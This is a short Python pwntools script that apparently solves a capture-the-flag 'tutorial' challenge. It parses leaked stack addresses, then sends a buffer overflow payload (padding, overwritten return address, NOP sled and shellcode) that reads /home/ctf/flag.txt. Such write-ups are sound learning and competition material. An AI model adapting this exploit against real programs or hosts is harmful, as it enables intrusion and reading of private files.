import sys
import struct

import pwnlib.asm
import pwnlib.context
from pwnlib.tubes import process, remote
import pwnlib.shellcraft.amd64.linux as linux_sc
import pwnlib.shellcraft.amd64 as x86_sc


def hostport(hp):
    h, p = hp.split(':')
    return h, int(p)


def main():
    pwnlib.context.context.update(os='linux', arch='amd64')
    if len(sys.argv) == 2:
        proc = remote.remote(*hostport(sys.argv[1]))
    elif len(sys.argv) == 3:
        proc = remote.remote(sys.argv[1], int(sys.argv[2]))
    else:
        proc = process.process('../challenge/tutorial')
    proc.recvuntil(b'Good luck!\n')
    proc.recvline()
    proc.recvline()

    # Get some info we'd like
    line = proc.recvline().decode().strip().replace('.', '')
    _, addrstr = line.split(' at ')
    bufaddr = int(addrstr, 0x10)

    line = proc.recvline().decode().strip().replace('.', '')
    _, addrstr = line.split(' at ')
    jmp = int(addrstr, 0x10)

    line = proc.recvline().decode().strip().replace('.', '')
    _, addrstr = line.split(' at ')
    saved_ip = int(addrstr, 0x10)

    dist = saved_ip - bufaddr
    print('Buf: {:x}, saved_ip: {:x}, jmp: {:x}, dist: {}'.format(
        bufaddr, saved_ip, jmp, dist))

    shellsrc = linux_sc.cat(b'/home/ctf/flag.txt')
    shellsrc += linux_sc.exit()
    buf = b'A'*dist
    buf += struct.pack('<Q', jmp)
    buf += b'\x90' * 32  # some padding
    buf += pwnlib.asm.asm(shellsrc)

    hexbuf = buf.hex()
    proc.send('{}\n'.format(hexbuf).encode())
    for i in range(6):
        print(i, proc.recvline())


if __name__ == '__main__':
    main()
